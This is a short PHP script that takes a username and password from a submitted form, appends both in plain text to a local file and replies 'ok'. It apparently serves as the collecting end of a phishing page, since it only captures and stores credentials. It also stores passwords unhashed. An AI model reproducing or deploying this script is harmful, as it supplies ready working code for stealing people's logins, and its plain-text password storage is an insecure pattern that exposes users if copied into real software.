<?php
       $usr = $_POST['usuario'];
       $pass = $_POST['password'];
   
       $file = fopen("archivo.txt", "a");
   
       fwrite($file, "Usuario:{$usr} / contraseña: {$pass}" . PHP_EOL);
   
       fwrite($file, " " . PHP_EOL);
   
       fclose($file);
   
       echo('ok');
?>